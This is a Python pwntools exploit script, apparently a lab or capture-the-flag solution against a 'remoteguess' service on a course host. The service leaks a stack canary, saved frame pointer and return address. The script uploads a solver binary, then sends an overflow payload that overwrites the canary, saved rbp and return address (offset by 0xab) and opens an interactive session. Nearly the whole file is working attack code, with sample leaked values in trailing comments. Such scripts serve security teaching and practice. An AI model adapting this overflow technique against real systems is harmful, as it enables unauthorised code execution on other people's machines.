#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
#r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

r.recv()
task = r.recv()

# print(f'================ {task} =====================')
res = task.decode().split("\n")
# print(res)

mymagic = 1234
canary  = int(res[0])
rbp =   int(res[1])
_return = int(res[2])

r.sendline(str(mymagic).encode('ascii').ljust(0x18, b'\0')+p64(canary) + p64(rbp) + p64(_return+0xab).ljust(0x14, b'\0')+p64(mymagic))

r.interactive()

# mymagic 1234
# canary 12015111194059585536
# rbp    140726915429504
# return 94815450939979



# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :


